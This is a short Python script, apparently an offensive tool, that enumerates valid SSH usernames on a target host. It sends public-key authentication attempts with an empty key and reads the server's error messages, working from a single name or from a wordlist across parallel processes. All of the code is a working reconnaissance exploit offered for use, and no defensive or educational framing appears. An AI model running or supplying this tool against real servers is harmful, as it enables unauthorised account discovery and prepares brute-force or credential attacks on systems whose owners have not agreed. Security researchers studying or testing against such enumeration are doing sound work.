#!/usr/bin/python3
import argparse
import multiprocessing
import socket
from ssh2.session import Session

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', dest='hostname', type=str, help='Single target')
arg_parser.add_argument('-p', dest='port', type=int, default=22, help='port to connect on: Default port is 22')
arg_parser.add_argument('-u', dest='username', type=str, help='username you want to enumerate')
arg_parser.add_argument('-w', dest='wordlist', help='enumerate multiple users')
args = arg_parser.parse_args()
port = args.port
target = args.hostname

def ssh_user_enum(username, *args, **kwargs):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)

    try:
        sock.connect((target, port))
    except socket.error:
        print('[-] Failed to connect')
        return

    session = Session()
    session.handshake(sock)

    try:
        session.userauth_publickey_frommemory(username, b'')
    except Exception as e:
        if 'Invalid key' in str(e):
            print('[*] {} - Invalid username'.format(username))
        elif 'Authentication failed' in str(e):
            print('[+] {} - Valid username'.format(username))

    sock.close()

if args.username is not None:
    username = args.username
    ssh_user_enum(username)

if args.wordlist is not None:
    usernames = []
    pool = multiprocessing.Pool(5)
    with open(args.wordlist) as f:
        for u in f:
            usernames.append(u.strip())
    pool.map(ssh_user_enum, usernames)
